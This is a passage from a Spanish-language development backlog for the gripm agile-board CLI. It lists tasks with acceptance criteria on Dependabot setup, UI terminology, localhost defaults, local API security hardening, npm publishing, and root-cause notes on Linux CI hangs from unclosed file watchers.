- [x] #3 Los pasos sensibles a plataforma están resueltos de forma agnóstica (`prepare` en `package.json` migrado a `node scripts/prepare-hooks.js` sin redirección shell POSIX `/dev/null`)
- [x] #4 La matriz declara `strategy.fail-fast: false` para que un runner fallido no cancele los demás jobs
- [x] #5 `timeout-minutes` se ajusta a 15 minutos para acomodar la ejecución paralela
- [x] #6 `npm run backlog:sync && npm run backlog:check` en verde, `npx tsc --noEmit` con 0 errores y `npm test` con exit 0

---

#### [DEV-175] Automatizar Actualizaciones de Dependencias con Dependabot
- **Prioridad**: `low` | **Tipo**: `chore`

El repositorio no tiene `.github/dependabot.yml`. Un proyecto con 8 dependencias de runtime y 4 de desarrollo, en un tarball que se distribuye globalmente, queda de mantenimiento manual.

### Evidencia (verificada sobre `6a50230`)

```
$ test -f .github/dependabot.yml
NO

$ find .github -type f
.github/ISSUE_TEMPLATE/bug_report.yml
.github/ISSUE_TEMPLATE/config.yml
.github/ISSUE_TEMPLATE/feature_request.yml
.github/PULL_REQUEST_TEMPLATE.md
.github/workflows/ci.yml
```

### Superficie de dependencia

| Paquete | Tipo | Rol |
| :--- | :--- | :--- |
| `vite` | runtime | servidor embebido (`bin/gripm.js:212`) |
| `react`, `react-dom` | runtime | render de la interfaz |
| `lucide-react` | runtime | iconografía (45 MB en disco, verificado) |
| `tailwindcss`, `postcss`, `autoprefixer`, `@vitejs/plugin-react` | runtime | plugins cargados al leer `vite.config.ts` |
| `typescript`, `@types/*` | dev | toolchain |

### Riesgo específico de este proyecto

`SECURITY.md` describe un producto que **ejecuta binarios con permisos del usuario y escribe en su disco**. Una vulnerabilidad transitiva en `vite` - que es el servidor HTTP que corre en cada sesión - es un vector de ataque real, no teórico. `vite` es la dependencia más expuesto del stack.

### Objetivo

Que las actualizaciones de seguridad se apliquen de forma automática y visible, y que las de Features queden agrupadas para revisión manual.

**Criterios de Aceptación:**
- [x] #1 `.github/dependabot.yml` existe con el ecosistema `npm` y un calendario semanal
- [x] #2 Cubre tanto `dependencies` como `devDependencies` (directorio `/`)
- [x] #3 Declara una separación entre actualizaciones de seguridad (`open-pull-requests-limit` alto, agrupadas con label) y de features (agrupadas por menoría, con label distinta)
- [x] #4 Existe una etiqueta aplicada a los PRs de seguridad para que `SECURITY.md` pueda referenciar el canal
- [x] #5 Configuración lista para activación automática del primer ciclo en GitHub al publicarse el repositorio
- [x] #6 `npm run backlog:sync && npm run backlog:check` en verde, `npx tsc --noEmit` con 0 errores y `npm test` con exit 0

---

#### [DEV-176] Adopción del Término Tablero en Español y Sustitución de Cockpit en UI y CLI
- **Prioridad**: `medium` | **Tipo**: `chore`

En la versión en español, la interfaz y los scripts utilizaban el término anglosajón 'cockpit', el cual resulta forzado, poco intuitivo y distante para los desarrolladores hispanohablantes.

Tras la deliberación de identidad y narrativa del producto, se adopta de forma canónica el término **'tablero'** (y **'tablero ágil'** cuando califica al sistema), por ser una definición directa, transparente, alineada con la cultura de ingeniería y perfectamente coherente con el comando nativo del CLI (`npm run board`).

### Cambios a realizar:
1. **Internacionalización en UI:**
   - Incorporar claves `app.badge` y `settings.systemTitle` en diccionarios `src/locales/es.json` y `en.json`.
   - En `src/App.tsx`, reemplazar el badge hardcodeado 'cockpit' por `t('app.badge')` ('tablero' en español, 'board' en inglés).
   - En `src/components/SettingsView.tsx`, reemplazar `<span>gripm Cockpit</span>` por `<span>{t('settings.systemTitle')}</span>`.
2. **Splash HTML estático:**
   - En `index.html`, actualizar el badge a 'tablero' y el texto a 'Iniciando tablero ágil...'.
3. **Banners y mensajes CLI:**
   - En `bin/gripm.js`, actualizar el banner de arranque a 'Tablero Ágil de Ingeniería y Producto con IA'.
   - En `scripts/initScaffold.js`, actualizar la instrucción a 'Para abrir el tablero:'.
4. **Documentación en Español:**
   - En `README.es.md` y `docs/ARCHITECTURE.md`, sustituir referencias no intencionadas de 'cockpit' por 'tablero' o 'tablero ágil'.

**Criterios de Aceptación:**
- [x] #1 `src/locales/es.json` y `src/locales/en.json` exponen `app.badge` ("tablero" / "board") y `settings.systemTitle` ("gripm Tablero" / "gripm Board")
- [x] #2 `src/App.tsx` utiliza `t('app.badge')` en el badge de carga de la aplicación en lugar del literal hardcodeado 'cockpit'
- [x] #3 `src/components/SettingsView.tsx` renderiza `t('settings.systemTitle')` en la tarjeta de información del sistema en lugar del literal 'gripm Cockpit'
- [x] #4 `index.html` muestra 'tablero' y 'Iniciando tablero ágil...' en el splash inicial HTML estático
- [x] #5 `bin/gripm.js` y `scripts/initScaffold.js` utilizan 'Tablero Ágil' y 'Para abrir el tablero:' en sus salidas en español
- [x] #6 `README.es.md` y `docs/ARCHITECTURE.md` sustituyen 'cockpit' por 'tablero' / 'tablero ágil' en sus secciones en español
- [x] #7 `npx tsc --noEmit` compila con 0 errores, `npm test` pasa con exit 0, `npm run backlog:sync && npm run backlog:check` en verde y `npm run build` compila sin errores

---

#### [DEV-177] Priorizar Localhost en URL por Defecto de Vite y CLI Manteniendo Bind Loopback IPv4
- **Prioridad**: `medium` | **Tipo**: `enhancement`

En DEV-169 se unificó el enlace de red del servidor a la dirección loopback IPv4 (`127.0.0.1`) para garantizar compatibilidad con herramientas de línea de comandos (`curl`, scripts) y evitar que macOS limitara la escucha exclusivamente a IPv6 (`[::1]`).

Sin embargo, al establecer de forma estricta `host = '127.0.0.1'` en la configuración de Vite (`vite.config.ts`) y en el binario ejecutable (`bin/gripm.js`), tanto la salida por consola (`➜ Local: http://127.0.0.1:4100/`) como la URL abierta por defecto en el navegador pasaron a exponer la dirección IP numérica en lugar del nombre canónico `localhost`. Para usuarios finales y desarrolladores, las direcciones IP numéricas resultan menos amigables, más técnicas y menos estéticas que `localhost`.

Dado que los navegadores modernos y las pilas de red locales resuelven `localhost` de manera transparente y realizan fallback inmediato a `127.0.0.1` (o dual-stack), la solución óptima es:
1. Mantener el socket de escucha en `127.0.0.1` bajo el capó para preservar la compatibilidad probada en DEV-169.
2. Configurar la URL de apertura (`server.open`) y la URL informada en la consola de Vite (`server.resolvedUrls.local`) para que muestren por defecto `http://localhost:<puerto>/`.
3. Ajustar el banner ASCII y la apertura del navegador en `bin/gripm.js` para priorizar `localhost` cuando el host sea el loopback por defecto.
4. Preservar cualquier host personalizado cuando el usuario especifique explícitamente `--host` o `GRIPM_HOST` (por ejemplo `0.0.0.0` o una IP de red).

**Criterios de Aceptación:**
- [x] #1 En `vite.config.ts`, la URL configurada para apertura automática (`server.open`) utiliza `http://localhost:<puerto>/` cuando el host es el default loopback (`127.0.0.1`) y no está deshabilitada por CI o variables de entorno
- [x] #2 En el plugin de Vite de `vite.config.ts`, `server.listen` mapea `127.0.0.1` a `localhost` en `server.resolvedUrls.local` para que la salida de consola (`Local:`) y los atajos de teclado del CLI muestren `http://localhost:<puerto>/`
- [x] #3 En `bin/gripm.js`, el banner ASCII y la llamada a `openBrowser` muestran y abren `http://localhost:<puerto>` por defecto cuando se enlaza al loopback `127.0.0.1`
- [x] #4 Se conserva intacta la compatibilidad con hosts explícitos: si se define `--host 0.0.0.0` o `GRIPM_HOST=<otro>`, se respeta dicho valor sin forzar `localhost`
- [x] #5 Se preserva la compatibilidad de red de DEV-169: el servidor continúa enlazando a `127.0.0.1` a nivel socket, permitiendo que tanto `localhost` en navegador como `127.0.0.1` en herramientas locales reciban respuesta HTTP 200
- [x] #6 `npx tsc --noEmit` compila con 0 errores, `npm test` pasa con exit 0, `npm run backlog:sync && npm run backlog:check` en verde y `npm run build` compila sin errores

---

#### [DEV-179] Alineación de Playbook Upstream a gripm-playbook y Preservación de gripm como Repositorio Insignia
- **Prioridad**: `high` | **Tipo**: `improvement`

Alinear las referencias y automatizaciones de sincronización del Playbook tras su renombramiento canónico a `gripm-playbook` (`pablojavierrodriguez/gripm-playbook`), preservando a `gripm` como el repositorio insignia (*flagship*) único y unificado del ecosistema.

**Decisión de Arquitectura de Ecosistema:**
1. **`gripm` (este repositorio):** Es el producto estrella integral (*batteries-included*). Contiene el cockpit visual, motor Markdown, servidor MCP, CLI global y las skills canónicas del playbook ya integradas y sincronizadas. No requiere renombrarse a `gripm-board`, conservando la máxima simplicidad y peso de marca (`github.com/pablojavierrodriguez/gripm`).
2. **`gripm-playbook`:** Existe como repositorio desacoplado e independiente para usuarios y proyectos (Python, Go, Rust, etc.) que desean adoptar la metodología, roles y skills de agentes sin clonar ni depender del stack del cockpit.
3. **Sincronización:** Se actualiza el sincronizador (`scripts/sync-playbook.mjs`), la documentación (`docs/AGENTIC_PLAYBOOK.md`) y los badges del proyecto (`README.md`, `README.es.md`) para consumir desde el nuevo upstream `pablojavierrodriguez/gripm-playbook`.

**Criterios de Aceptación:**
- [x] #1 Actualizar DEFAULT_REMOTE en scripts/sync-playbook.mjs apuntando a pablojavierrodriguez/gripm-playbook
- [x] #2 Actualizar enlace a upstream en docs/AGENTIC_PLAYBOOK.md hacia pablojavierrodriguez/gripm-playbook
- [x] #3 Actualizar badges y referencias de metodología en README.md y README.es.md reflejando gripm-playbook
- [x] #4 Preservar la identidad canónica soberana de gripm como repositorio insignia (package.json, binarios, CI/CD) sin fragmentación innecesaria
- [x] #5 Verificar que la suite unificada de calidad (tsc, npm test, backlog:check, publish:check) pase con código 0

---

#### [DEV-181] Saneamiento P0 de Frontera OSS: Fugas en Skills, Contrato MCP y Endurecimiento de Seguridad
- **Prioridad**: `urgent` | **Tipo**: `bug`

Ejecutar el saneamiento integral de frontera pública identificado en la auditoría técnica de código abierto (`docs/informe-auditoria.md`):

1. **Fuga de contexto en Skills:** Eliminar residuos de proyectos privados (`YourApp`, `PermissionGate`, `People.tsx`, `MeetingDetailModal`, `Check-in QR`, `Ministerios y grupos`, etc.) y corregir tokens sintéticos inválidos (`'regional-locale'`) en `.agents/skills/`.
2. **Contrato de Herramientas MCP:** Corregir `.agents/skills/gripm/SKILL.md` para erradicar las llamadas `devboard_*` obsoletas y documentar con fidelidad las 12 herramientas canónicas `gripm_*`.
3. **Endurecimiento de Seguridad en API Local:** Contener `/api/fs/browse` dentro de rutas autorizadas (`os.homedir()`) y proteger el comportamiento de CORS/Host cuando se configura `0.0.0.0`.
4. **Higiene Documental:** Remover referencias a tooling eliminado (ESLint) y actualizar conteos de métricas del proyecto en los READMEs.

**Criterios de Aceptación:**
- [x] #1 Erradicar de .agents/skills/ todas las referencias a YourApp y componentes/contextos de proyectos privados, convirtiéndolas en plantillas universales
- [x] #2 Reemplazar en .agents/skills/ tokens sintéticos inválidos ('regional-locale') y clases CSS no declaradas
- [x] #3 Actualizar .agents/skills/gripm/SKILL.md reemplazando devboard_* por el catálogo canónico de 12 tools gripm_*
- [x] #4 Implementar contención en /api/fs/browse (vite.config.ts) validando que targetDir resida dentro de os.homedir() o rutas permitidas (403 Forbidden ante escapes)
- [x] #5 Endurecer reglas de seguridad cuando se usa host 0.0.0.0 sin deshabilitar protecciones de Host ni reflejar Origin indiscriminadamente
- [x] #6 Limpiar menciones de ESLint y actualizar conteos de tareas y sprints en README.md, README.es.md y CHANGELOG.md
- [x] #7 Validar que la pirámide completa de verificación (tsc, npm test, backlog:check, publish:check, build) pase con código 0

---

#### [DEV-182] Pipeline de Despliegue Continuo (CD): Automatización de npm publish con GitHub Actions y Provenance
- **Prioridad**: `medium` | **Tipo**: `improvement`

Configurar e implementar el workflow automatizado de despliegue continuo (CD) para la publicación en el registro público de npm (`@gripm/board` y `@gripm/playbook`) ante la creación de releases o tags en GitHub, eliminando la necesidad de publicación manual desde terminales locales.

**Puntos clave identificados en auditoría (R19):**
1. **Disparador:** Ejecución automática en eventos `release: [published]` o push de tags `v*`.
2. **Seguridad y Provenance:** Publicación con flag `--provenance` mediante permisos OIDC (`id-token: write`, `contents: read`).
3. **Validación previa:** Ejecutar `prepublishOnly` verificando build y `publish:check` sin fugas antes de publicar.

**Criterios de Aceptación:**
- [x] #1 Crear workflow .github/workflows/publish.yml en gripm con trigger de release/tag
- [x] #2 Configurar permisos OIDC id-token: write y contents: read para soporte de npm provenance
- [x] #3 Documentar en docs o README el uso del secret NPM_TOKEN o Trusted Publishing
- [x] #5 Validar que un dry-run de empaquetado y build ejecute exitosamente en CI antes del publish

---

#### [DEV-183] Higiene de Documentación Secundaria: Unificación de Logs Internos, Endpoints de Arquitectura y Metadata
- **Prioridad**: `low` | **Tipo**: `chore`

Ejecutar la limpieza y actualización de documentación técnica secundaria y residuos de logs internos identificados en el informe de auditoría técnica (R11):

1. **Logs y Fallbacks de UI:** Erradicar cadenas residuales `[DevBoard]` en `App.tsx` y fallbacks `|| 'dev-board'` en `ReleaseAssembler.tsx`.
2. **Endpoints en Arquitectura:** Corregir menciones obsoletas de endpoints en `docs/ARCHITECTURE.md` (`/api/backlog`, `/api/tasks` por los reales `/api/data`, `/api/items`).
3. **Métricas en Docs:** Sincronizar recuentos de herramientas MCP en `CONTRIBUTING.md` (12 tools) y tiempos reales de tests.
4. **Metadata de Repositorio:** Configurar topics de GitHub oficiales para gripm basados en las palabras clave del paquete.

**Criterios de Aceptación:**
- [x] #1 Erradicar prefijos de log residuales [DevBoard] en App.tsx reemplazando por [gripm]
- [x] #2 Actualizar fallbacks de proyecto en ReleaseAssembler.tsx
- [x] #3 Corregir la descripción de endpoints del servidor en docs/ARCHITECTURE.md
- [x] #4 Sincronizar catálogo de MCP tools y notas en CONTRIBUTING.md
- [x] #5 Verificar que la suite de tests y backlog:check pasen con código 0

---

#### [DEV-184] Endurecimiento del Playbook: Consistencia de Estados T0-T5, Opt-outs en audit:ux y Reglas Multilínea
- **Prioridad**: `medium` | **Tipo**: `improvement`

Resolver las inconsistencias menores identificadas en el marco de trabajo `gripm-playbook` (hallazgos R8, R9 y R12 del informe de auditoría):

1. **Consistencia de Transiciones (R9):** Alinear los IDs de transición en `docs/sprints/SPRINT_SPEC_TEMPLATE.md` y `TEAM_PLAYBOOK.md` para coincidir de forma unívoca con `STATE_MACHINE.md` (T0 a T5, eliminando la referencia ficticia a T6).
2. **Soporte de Opt-outs (R8):** Implementar la propiedad `exclude` documentada en `.uxaudit.json` dentro de `audit-ux-code.cjs`, o limpiar la documentación en caso de ser redundante.
3. **Robustez en Motor de Reglas UX (R12):** Corregir el contador de delimitadores en `buildUnits` para ignorar flechas de funciones (`=>`) y prevenir falsos positivos de UX-001 en inputs multilínea.

**Criterios de Aceptación:**
- [x] #1 Corregir IDs de transición en SPRINT_SPEC_TEMPLATE.md y TEAM_PLAYBOOK.md alineándolos con STATE_MACHINE.md
- [x] #2 Implementar soporte de exclude en audit-ux-code.cjs o unificar la especificación en la documentación
- [x] #3 Corregir la heurística de cierre de etiquetas en buildUnits para evitar falsos positivos con arrow functions multilínea
- [x] #4 Agregar test fixture multilínea en la suite de tests del playbook
- [x] #5 Validar que npm run check:all pase en verde en gripm-playbook

---

#### [DEV-185] Corrección de Desacople Interactivo: Reemplazar node:readline por node:readline/promises en scripts/uninstall.js
- **Prioridad**: `high` | **Tipo**: `bug`

Al ejecutar `npx gripm --uninstall` (o `gripm --clean`) en una terminal interactiva (TTY), el proceso fallaba inmediatamente con:
`TypeError: Cannot read properties of undefined (reading 'trim')`.

**Causa Raíz:**
En `scripts/uninstall.js`, se importaba `node:readline` (basado en callbacks) en lugar de `node:readline/promises`. Por consiguiente, `await rl.question('')` evaluaba a `undefined`, provocando que la invocación `.trim()` fallara.

**Solución:**
1. Se migró la importación a `import readline from 'node:readline/promises';`.
2. Se añadieron salvaguardas defensivas para respuestas nulas `(rawAnswer || '').trim()`.
3. Se implementó la inyección opcional de streams (`input`, `output`, `interactive`) en `runUninstallCommand` para testeo automatizado de flujos interactivos.
4. Se extendió `scripts/verify-integration.js` con una prueba de integración interactiva que valida el ciclo interactivo completo de preguntas y respuestas sin regresiones.

**Criterios de Aceptación:**
- [x] #1 Importar node:readline/promises en scripts/uninstall.js para soportar llamadas async/await en rl.question
- [x] #2 Implementar manejo defensivo ante respuestas nulas al recortar con trim
- [x] #3 Soportar inyección de opciones de streams (input, output, interactive) en runUninstallCommand
- [x] #4 Agregar prueba de integración del flujo interactivo en scripts/verify-integration.js
- [x] #5 Validar que npm test y npm run backlog:check pasen con código 0

---

#### [DEV-186] Refactor de Tipos Core: Renombrar DevBoardConfig a GripmConfig y Unificar Interfaces
- **Prioridad**: `medium` | **Tipo**: `tech_debt`
- **Sprint / Milestone**: 1.0.5

Renombrar la interfaz canónica DevBoardConfig a GripmConfig en src/types.ts y propagar el cambio en los ~10 módulos consumidores (src/App.tsx, SettingsView.tsx, api.ts, etc.) manteniendo retrocompatibilidad mediante un type alias deprecated export type DevBoardConfig = GripmConfig;. Esto completa la unificación de identidad de tipos post-rebranding sin romper contratos externos.

**Criterios de Aceptación:**
- [x] #1 Definir GripmConfig como la interfaz canónica de configuración en src/types.ts
- [x] #2 Exportar export type DevBoardConfig = GripmConfig como alias con anotación @deprecated para retrocompatibilidad total
- [x] #3 Actualizar las referencias e importaciones en src/App.tsx, src/components/SettingsView.tsx, src/api.ts y demás módulos hacia GripmConfig
- [x] #4 Verificar que npx tsc --noEmit pase con 0 errores en modo estricto
- [x] #5 Validar que npm test y npm run backlog:check pasen con código 0

---

#### [DEV-189] Corregir el cuelgue del sondeo de puertos que bloqueaba npm test en CI
- **Prioridad**: `high` | **Tipo**: `bug`

`npm test` se colgaba en `ubuntu-latest` y mataba el job por `timeout-minutes`, con todos los asserts ya pasando. MacOS y Windows terminaban bien, lo que hacía el fallo parecer de infraestructura en lugar de un bug.

### Síntoma en CI

El log del job muestra la suite completa en verde y después nada:

```
🧹 Cleaned up test directory
🎉 Full verification passed successfully!
##[error]The operation was canceled.
```

El proceso terminó de trabajar pero nunca salió, así que el `&&` de `npm test` nunca avanzó al paso siguiente. Local el mismo script tarda 2s y sale con código 0.

### Causa raíz

`scripts/portUtils.js`, en `isPortAvailable`, sondea el puerto conectándose a él. El timeout del socket se fijaba con `socket.setTimeout(150)`, que **solo empieza a correr cuando el socket está establecido**. Un SYN descartado en vez de rechazado nunca llega a ese estado, así que la promesa nunca se resuelve.

En macOS el sistema operativo rechaza la conexión de inmediato y el proceso sale. En un runner Linux el puerto está filtrado, el SYN se descarta, y el `TCPConnectWrap` queda pendiente para siempre: mantiene vivo el event loop y Node nunca termina.

El test que disparaba el sondeo es DEV-177 en `scripts/verify-integration.js`, que resuelve la configuración real de Vite, y esa resolución llama a `findAvailablePort`.

### El error que cometí en el primer intento

La primera corrección añadió el timer guard con `guard.unref()`. Eso anula **justo el timer que debe resolver la promesa**: si es lo único que mantiene vivo el loop, Node sale antes de dispararlo y la promesa queda sin resolver. El síntoma pasó de "cuelgue silencioso" a `Detected unsettled top-level await`, que es el mismo bug con otro mensaje.

### Corrección posterior: esta tarea no era la causa del cuelgue de CI

Marqué el AC #5 (`npm test` sale con código 0 sin depender del sistema operativo) basándome en que la fuga del `TCPConnectWrap` era real y quedaba visible en macOS. **Eso fue una inferencia, no una verificación**, y estaba mal.

La fuga existía, pero había una segunda, mucho mayor, que solo se manifestaba en Linux: 207 `fs.FSWatcher` abiertos por `vite.config.ts`. La causa raíz real se documenta en DEV-190.

Dejé el AC #5 sin tildar a propósito. Un AC en verde sin aserción ejecutable es exactamente el tipo de mentira que hace inservible la pirámide de verificación.

Al cerrar el release ese AC ya no tenia sentido: afirmaba una propiedad (`npm test` sin dependencia del SO) que esta tarea nunca se propuso. Reescribir un AC para que pase es tan malo como tildarlo en falso, asi que lo deje declarado explicitamente como fuera de alcance, con DEV-190 como dueña de esa propiedad y su AC equivalente verificado. La diferencia es la misma honestidad: no digo "si se cumple", digo "no era mio".

**Criterios de Aceptación:**
- [x] #1 `isPortAvailable` resuelve aunque el connect nunca se complete, mediante un timer guard independiente del estado del socket
- [x] #2 El timer guard no está `unref`'d y el socket se destruye en todas las rutas de salida
- [x] #3 Existe test de regresión que reproduce el SYN descartado de forma determinista, para que el bug no vuelva en silencio en macOS o Windows
- [x] #4 El test cubre también el comportamiento normal: puerto ocupado se reporta ocupado, puerto libre se reporta libre
- [x] #5 Alcance de esta tarea: el fix del sondeo queda verificado por su propio test de regresión. La propiedad de que `npm test` no dependa del sistema operativo **no es de esta tarea**: se rastreó y corrigió en DEV-190, que es su dueña.

---

#### [DEV-190] Corregir el cuelgue real de npm test en Linux: watchers de archivo sin cerrar
- **Prioridad**: `high` | **Tipo**: `bug`

`npm test` se colgaba en `ubuntu-latest` y mataba el job por `timeout-minutes`, con todos los asserts ya pasando. El log siempre terminaba igual:

```
🧹 Cleaned up test directory
🎉 Full verification passed successfully!
##[error]The operation was canceled.
```

El proceso terminaba el trabajo y nunca salía, así que el `&&` de la cadena nunca avanzaba al script siguiente.

### Lo que NO era

Durante varias iteraciones estuve persiguiendo la fuga equivocada. La fuga del sondeo de puertos de DEV-189 (`TCPConnectWrap` al 4100) **era real**, pero no era la causa: era un handle entre unos 200.

### La causa raíz

`vite.config.ts` abre un `fs.watch()` recursivo por cada directorio del registro. El código intentaba soltarlos así:

```ts
if (typeof watcher.unref === 'function') watcher.unref();
```

**`fs.watch()` devuelve un `FSWatcher`, y `FSWatcher` no tiene método `unref()`.** El guard era código muerto: la condición nunca era cierta y nadie lo notó porque no hay error, simplemente no hace nada.

Los watchers quedaban referenciados, mantenían vivo el event loop y en Linux impedían que el proceso terminara. En macOS el proceso salía igual, lo que escondía el bug por completo.

Dos scripts los abrían:

- `scripts/verify-integration.js` (DEV-177, vía `plugin.configureServer` con un server mock): 207 watchers
- `scripts/test-api-security.js`: 200 watchers

El segundo estaba **tapado**: el primero colgaba antes y la cadena `&&` nunca llegaba al segundo. Cada vez que se arreglaba uno, aparecía el siguiente.

### El patrón que fallaba

Todos los servidores de prueba eran mocks sin ciclo de vida. `configureServer` no tenía dónde registrar una limpieza, y el test no tenía con qué cerrarlos.

**Criterios de Aceptación:**
- [x] #1 `closeWatchers()` existe y cierra todos los watchers abiertos por `setupProjectWatchers()`
- [x] #2 Los watchers se liberan cuando el servidor HTTP se cierra, para que el dev server no los filtre en caliente
- [x] #3 `verify-integration.js` y `test-api-security.js` liberan los watchers en su cleanup
- [x] #4 Un watchdog nombra los handles vivos si cualquier paso se cuelga, sin depender del SO
- [x] #5 `npm test` reporta duración por paso y falla nombrando el paso culpable
- [x] #6 La suite completa pasa en Linux dentro de un contenedor: 15 pasos, 13.4s, código 0
- [x] #7 La suite sigue pasando en macOS
- [x] #8 Existe un gate en pre-commit que rechaza YAML inválido, `import()` con rutas crudas, corrupción de codificación y tareas con id descuadrado
- [x] #9 Cada check del gate se validó reintroduciendo el bug original y confirmando que lo rechaza
- [x] #10 El gate no produce falsos positivos sobre el árbol correcto

---

#### [DEV-191] Actualizar las GitHub Actions deprecadas que corren forzadas en Node 24
- **Prioridad**: `medium` | **Tipo**: `chore`
- **Sprint / Milestone**: 1.0.5

Cada corrida de los workflows termina con este warning de GitHub:

```
##[warning]Node.js 20 is deprecated. The following actions target Node.js 20 but
are being forced to run on Node.js 24: actions/checkout@v4, actions/setup-node@v4.
```

`actions/checkout@v4` y `actions/setup-node@v4` apuntan a Node 20, que GitHub ya no soporta. Hoy funcionan porque el runner los fuerza a Node 24, o sea que el runtime real no es el que la action pide. Eso es una dependencia implícita de un comportamiento que GitHub puede cambiar sin avisar, y el día que deje de forzarla, los jobs dejan de andar.

Aparece en `ci.yml` y en `publish.yml`. El de `publish.yml` importa más: es el que publica a npm.

Vale notar que esto no surfaced por una falla, sino por un warning al final de un run exitoso. Es exactamente la clase de cosa que se pierde si solo se leen los pasos con `failure`.

**Criterios de Aceptación:**
- [x] #1 `actions/checkout` actualizado a la major que apunta a Node 24 o superior
- [x] #2 `actions/setup-node` actualizado a la major que apunta a Node 24 o superior
- [x] #3 Ningún otro action del repo queda apuntando a una versión de Node deprecada
- [x] #4 La matriz de CI sigue en verde en los 3 sistemas operativos y las 2 versiones de Node
- [x] #5 El workflow de publicación sigue funcionando: `npm view @gripm/board@<version>` responde tras un tag de prueba

---

#### [DEV-192] Normalizar los IDs de sprint: hay un prefijo duplicado y un ID basado en timestamp
- **Prioridad**: `low` | **Tipo**: `chore`
- **Sprint / Milestone**: 1.0.5

`backlog/sprints.json` tiene 9 sprints y dos de sus IDs no siguen el patrón `sprint-<n>`:

```
sprint-0                 Sprint 0
sprint-1                 Sprint 1
sprint-2                 Sprint 2
sprint-3                 Sprint 3
sprint-4                 Sprint 4
sprint-1790252674566     Sprint 5     <- ID basado en timestamp
sprint-6                 Sprint 6
sprint-sprint-7          Sprint 7     <- prefijo duplicado
sprint-8                 Sprint 8
```

`sprint-sprint-7` tiene el prefijo `sprint-` duplicado, y `sprint-1790252674566` se generó con `Date.now()` en lugar de secuencia. Visualmente el nombre es correcto ("Sprint 7"), así que el defecto está oculto hasta que algo consume el ID.

### Por qué importa aunque hoy no rompa nada

Verificado: **ninguna tarea, release ni entrada de `BACKLOG.md` referencia estos dos IDs**. La migración no tiene costo de datos.

El riesgo es latente, no activo. Los IDs son la clave de agrupación y de las queries del filtro de sprint; un ID con doble prefijo rompe cualquier comparación por `startsWith` o por regex que asuma el patrón, y un timestamp no ordena igual que el resto de la secuencia.

### Origen probable

El `sprint-sprint-7` sugiere que en algún momento el nombre ya venía prefijado y el código que genera el ID le agregó el prefijo otra vez. El timestamp sugiere un camino de creación alternative que no participa de la secuencia.

**Criterios de Aceptación:**
- [x] #1 Los 9 IDs de `backlog/sprints.json` siguen el patrón `sprint-<n>`
- [x] #2 La secuencia es correlativa y coincide con el nombre del sprint
- [x] #3 El generador de IDs de sprint no puede producir un prefijo duplicado
- [x] #4 El generador de IDs de sprint no puede producir un ID basado en timestamp
- [x] #5 `npm run backlog:check` sigue en verde después de la migración
- [x] #6 La vista de Sprint y el filtro por sprint muestran los 9 sprints con el mismo nombre que antes de la migración

---

#### [DEV-194] Corregir el orden de hooks al abrir ItemModal
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 1.0.4

En el smoke test de Gripm como producto, al crear una tarea el tablero muestra el error fatal `Rendered more hooks than during the previous render.`. `ItemModal` retorna cuando está cerrado antes de ejecutar `useFocusTrap`, pero ejecuta ese hook cuando se abre; React recibe un número distinto de hooks entre renders del mismo componente.

**Criterios de Aceptación:**
- [x] #1 `ItemModal` ejecuta el mismo conjunto de hooks y en el mismo orden tanto cerrado como abierto
- [x] #2 Abrir el modal de creación, guardar una tarea y volver al tablero no produce el error de hooks
- [x] #3 `npx tsc --noEmit` y `npm run build` pasan
- [x] #4 La suite incluye una regresión que verifica que `useFocusTrap` se invoca antes del retorno por modal cerrado

---

#### [DEV-195] Incluir logo en el paquete npm de Gripm
- **Prioridad**: `medium` | **Tipo**: `bug`
- **Sprint / Milestone**: 1.0.4

En el smoke test con Gripm instalado globalmente en otro repositorio, no se ve el logo. La interfaz lo solicita desde `/logo.png` y el asset vive en `public/logo.png`, pero `package.json` publica una allowlist que incluye `dist` y omite `public`. El CLI levanta Vite desde el paquete instalado, por lo que el archivo público debe estar presente en el tarball.

**Criterios de Aceptación:**
- [x] #1 El tarball de npm contiene `public/logo.png`
- [x] #2 El CLI sirve `/logo.png` correctamente al ejecutarse contra el repo smoke-test
- [x] #3 `npm run publish:check` exige que `public/logo.png` esté presente en el tarball
- [x] #4 El paquete Gripm no se declara a sí mismo como dependencia y el lockfile coincide con el manifiesto

---

#### [DEV-196] Preservar plantillas de skill por idioma en el paquete
- **Prioridad**: `medium` | **Tipo**: `bug`
- **Sprint / Milestone**: 1.0.4

Al inicializar el propio repositorio Gripm en inglés, `gripm --init` escribe la skill inglesa sobre `.agents/skills/gripm/SKILL.md`, que también funciona como plantilla canónica española del paquete. Después, el test `verify-dist` instala una skill inglesa incluso cuando pide `--language es` y falla su aserción. Las plantillas de distribución deben ser estables e independientes del idioma escogido para inicializar el repo fuente.

**Criterios de Aceptación:**
- [x] #1 El idioma configurado para el repo Gripm no puede sobrescribir la plantilla canónica de otro idioma
- [x] #2 `npm test` verifica la instalación de skills en inglés y español después de inicializar el repo fuente en inglés
- [x] #3 El tarball npm contiene las fuentes canónicas para ambos idiomas

---

#### [DEV-197] Propagar fallos del smoke test Linux
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 1.0.4

`npm run test:linux` puede terminar con exit code 0 aunque la suite interna haya fallado. `scripts/repro-ci-linux.sh` imprime `SUITE_EXIT=1`, pero luego completa correctamente el shell del contenedor con el `echo`, ocultando el resultado de `npm test` a CI y a quien ejecuta localmente.

**Criterios de Aceptación:**
- [x] #1 `npm run test:linux` devuelve exit code distinto de cero si falla `npm test` dentro del contenedor
- [x] #2 `npm run test:linux` devuelve exit code 0 cuando pasan todos los pasos
- [x] #3 La suite Linux corre contra el árbol local actual, incluyendo archivos no stageados

---

#### [DEV-198] Automatizar smoke test de creación de tarea en navegador
- **Prioridad**: `high` | **Tipo**: `chore`
- **Sprint / Milestone**: 1.0.4

La suite de CI no ejercita un flujo real de navegador para los caminos principales del usuario. Un error de orden de hooks impedía abrir el modal de nueva tarea aunque los tests existentes pasaban. Incorporar un smoke test automatizado y acotado que levante Gripm en un repo temporal, confirme que el logo carga, abra el modal, cree una tarea y verifique su persistencia.

**Criterios de Aceptación:**
- [x] #1 Un test automatizado inicia el CLI contra un proyecto temporal aislado
- [x] #2 El navegador confirma que el logo es visible y se cargó sin error
- [x] #3 El test abre el modal, crea una tarea y verifica la persistencia en el repo
- [x] #4 El test falla si la consola registra errores fatales o la UI muestra el ErrorBoundary
- [x] #5 El smoke test corre en CI y se puede ejecutar localmente con un comando documentado

---

#### [DEV-199] Consolidar la marca Gripm en la aplicación y documentación viva
- **Prioridad**: `medium` | **Tipo**: `chore`
- **Sprint / Milestone**: 1.0.4

